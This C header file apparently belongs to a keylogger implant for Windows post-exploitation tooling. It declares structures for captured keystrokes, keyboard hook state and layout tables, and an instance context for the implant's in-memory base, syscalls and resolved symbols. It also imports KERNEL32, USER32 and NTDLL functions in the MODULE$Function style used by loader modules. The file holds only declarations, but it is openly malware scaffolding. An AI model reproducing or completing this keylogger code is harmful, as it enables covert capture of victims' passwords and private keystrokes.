#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <Native.h>
#include <windows.h>

#define NtLastError()                   ( NtCurrentTeb()->LastErrorValue  )
#define NtCurrentHeap()                 ( ( PVOID ) NtCurrentPeb()->ProcessHeap )

typedef struct _KEYSTROKES {
    UNICODE_STRING      Keys;
    struct _KEYSTROKES *Next;
} KEYSTROKES, *PKEYSTROKES;

typedef struct _KEYLOGGER {
    BOOL        Init;
    ULONG       ThreadId;
    PKEYSTROKES Keystrokes;
    HHOOK       Hook;

    PVOID KbTables;

    PSTR KbLang;
    PSTR KbDll;

    struct {
        PBYTE Buffer;
        ULONG Size;
    } Modifiers;

    ULONG Count;

    BYTE Locks;
} KEYLOGGER, *PKEYLOGGER;

typedef struct _INSTANCE {
    //
    // context to find our instance in memory
    //
    ULONG Context;

    //
    // syscall structure for the current syscall to be executed
    //
    PVOID Syscall;

    //
    // store already loaded functions
    //
    PVOID Symbol;

    //
    // base address and size
    // of the implant
    //
    struct {
        PVOID Buffer;
        ULONG Size;
    } Base;

    //
    // output for console
    // used by io::printf
    //
    HANDLE ConsoleOutput;

    //
    // keylogger related data
    //
    KEYLOGGER Keylogger;
} INSTANCE, *PINSTANCE;

DECLSPEC_IMPORT HMODULE KERNEL32$LoadLibraryA(
    LPCSTR lpLibFileName
);

DECLSPEC_IMPORT BOOL KERNEL32$VirtualProtect(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flNewProtect,
    PDWORD lpflOldProtect
);

DECLSPEC_IMPORT HANDLE KERNEL32$CreateThread(
    LPSECURITY_ATTRIBUTES  lpThreadAttributes,
    SIZE_T                 dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID                 lpParameter,
    DWORD                  dwCreationFlags,
    LPDWORD                lpThreadId
);

DECLSPEC_IMPORT DWORD KERNEL32$WaitForSingleObject(
    HANDLE hHandle,
    DWORD  dwMilliseconds
);

DECLSPEC_IMPORT BOOL KERNEL32$TerminateThread(
    HANDLE hThread,
    DWORD  dwExitCode
);

DECLSPEC_IMPORT HANDLE KERNEL32$OpenThread(
    DWORD dwDesiredAccess,
    BOOL  bInheritHandle,
    DWORD dwThreadId
);

DECLSPEC_IMPORT BOOL USER32$UnhookWindowsHookEx(
    HHOOK hhk
);

DECLSPEC_IMPORT BOOL KERNEL32$CloseHandle(
    HANDLE hObject
);

DECLSPEC_IMPORT VOID NTDLL$RtlFreeHeap(
    PVOID HeapHandle,
    ULONG Flags,
    PVOID BaseAddress
);

#endif //KEYLOGGER_H
